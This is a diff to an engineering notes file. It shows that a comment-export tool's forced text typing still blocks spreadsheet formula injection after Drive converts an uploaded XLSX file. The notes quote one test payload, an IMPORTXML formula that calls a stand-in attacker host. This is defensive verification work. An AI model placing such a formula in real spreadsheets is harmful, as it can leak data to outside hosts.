@@ -309,3 +309,77 @@ All three comments reported **`TAB=None`**. With two tabs, `B4` and `D9` are amb
 `Location.tab` resolution deferred in `CLAUDE.md` is not a theoretical gap. One of these comments
 says *"another comment in sheet 2"* in its own text, and the library cannot tell which sheet it is
 on.
+
+---
+
+# The narrowing works: a formatted register on CREATE, measured end to end
+
+**2026-08-31.** The finding above disqualified XLSX-upload for *existing* spreadsheets and
+predicted the route would be safe where `export_comments(destination="sheet")` sits, because that
+call **creates** the file it writes to. Built and measured.
+
+## What convert-on-upload actually preserves
+
+A workbook built by `_export` was uploaded as a new spreadsheet and read back through
+`spreadsheets.get(includeGridData=True)`:
+
+| Property | Survived |
+|---|---|
+| frozen header row | yes (`frozenRowCount: 1`) |
+| autofilter | yes (`basicFilter` present) |
+| header bold + fill | yes (`bold: true`, `1F3864`) |
+| column widths | yes (111 / 153 / 433 px, tracking the char widths set) |
+| data-validation dropdowns | yes (`ONE_OF_LIST ['TRUE','FALSE','NO_CHANGE']`) |
+| **forced text typing** | **yes** — see below |
+
+## The one that mattered: formula injection does NOT come back
+
+`_export` forces every data cell to text (#182) so a comment body beginning `=` cannot become a
+live formula. That defence is implemented in the **XLSX writer**, so the question was whether
+Drive re-infers types when converting — which would have made this change reintroduce the
+vulnerability while appearing to be a formatting improvement.
+
+It does not. Both payloads arrive as strings:
+
+```
+row 3: stringValue  formatted='=IMPORTXML("http://evil.example","//a")'
+row 4: stringValue  formatted='=1+1'
+```
+
+`=1+1` is the decisive one: Sheets evaluates formulas on entry, so a formula would read back as
+`2`. It reads back as `=1+1`, and `userEnteredValue` is `stringValue`, not `formulaValue`.
+
+## End to end through the tool
+
+`export_comments(destination="sheet", sheetName=…, tabName="Findings")` against a real document:
+
+```
+tab name        : Findings
+frozen rows     : 1
+autofilter      : PRESENT
+header bold     : True
+header fill     : {'red': 0.1216, 'green': 0.2196, 'blue': 0.3922}
+column widths   : [111, 153, 153, 111, 433, 433]
+dropdown cells  : 2
+```
+
+`tabName` is free on this route — it is the worksheet title in the workbook being built, so no
+`add_tab` and no create-then-move.
+
+## Two safety rules this establishes
+
+1. **Never upload a workbook over an existing spreadsheet** (the finding above: every comment
+   anchor resets to `A1`). Stated in `to_xlsx_bytes`' docstring, which is where somebody looking
+   for that route lands, and there is deliberately no library method that does it.
+2. **`destination="sheet"` now has two routes with two different formula defences**, and the
+   premise that makes one safe says nothing about the other — XLSX relies on forced text typing,
+   the values-API fallback on `value_input_option="RAW"`. `tests/test_raw_is_the_default.py`
+   pins both, the fallback by forcing `xlsx_supported()` false so it cannot quietly stop being
+   exercised.
+
+## Conclusion for #277
+
+No formatting API is needed on any surface. Docs take Markdown, Sheets take a workbook at
+creation, Slides use native `batchUpdate`. The register that was the motivating case now arrives
+formatted, and `spreadsheets.batchUpdate` remains available for a future case that genuinely
+needs to restyle an existing sheet.
